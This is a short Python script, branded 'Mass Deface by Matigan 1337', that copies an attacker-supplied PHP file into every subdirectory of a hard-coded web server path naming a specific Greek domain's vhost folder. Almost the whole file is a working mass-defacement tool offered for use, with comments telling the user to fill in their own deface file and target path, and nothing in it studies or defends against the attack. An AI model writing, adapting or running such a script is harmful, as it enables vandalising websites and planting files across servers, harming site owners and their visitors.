import os

print("""


 __    __     ______     ______     ______        _____     ______     ______   ______     ______     ______    
/\ "-./  \   /\  __ \   /\  ___\   /\  ___\      /\  __-.  /\  ___\   /\  ___\ /\  __ \   /\  ___\   /\  ___\   
\ \ \-./\ \  \ \  __ \  \ \___  \  \ \___  \     \ \ \/\ \ \ \  __\   \ \  __\ \ \  __ \  \ \ \____  \ \  __\   
 \ \_\ \ \_\  \ \_\ \_\  \/\_____\  \/\_____\     \ \____-  \ \_____\  \ \_\    \ \_\ \_\  \ \_____\  \ \_____\ 
  \/_/  \/_/   \/_/\/_/   \/_____/   \/_____/      \/____/   \/_____/   \/_/     \/_/\/_/   \/_____/   \/_____/ 
                                                                                                                
		BY MATIGAN 1337


	                                           

	""")

sc = "1337.php"   	#your file deface
disk = "/var/www/vhosts/donoussa.gr/" 	# path to deface example /var/www/
print("[*] Please wait ...")


def mass(root):
	try:
		x = os.listdir(root)
		for i in x:
			folder = os.path.join(root,i)
			if os.path.isdir(folder):
				buka = open(sc, "r").read()
				path = os.path.join(folder,sc)
				open(path, "w").write(buka)
				mass(folder)
	except:
		pass

print("[!] Done !")
mass(disk)
